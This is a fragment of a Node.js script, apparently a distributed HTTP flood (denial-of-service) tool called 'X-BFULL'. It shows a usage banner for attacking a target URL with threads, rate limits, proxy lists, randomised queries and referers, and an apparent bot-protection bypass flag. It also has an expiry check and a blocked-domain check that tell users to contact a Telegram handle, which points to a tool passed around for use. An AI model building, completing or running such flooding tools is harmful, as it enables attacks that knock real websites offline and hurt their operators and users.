...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    X-BFULL
    How to use & example:
      node x-bfull <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
      node x-bfull GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
...
if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @fann503');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg @fann503`);
    process.exit(1);
}
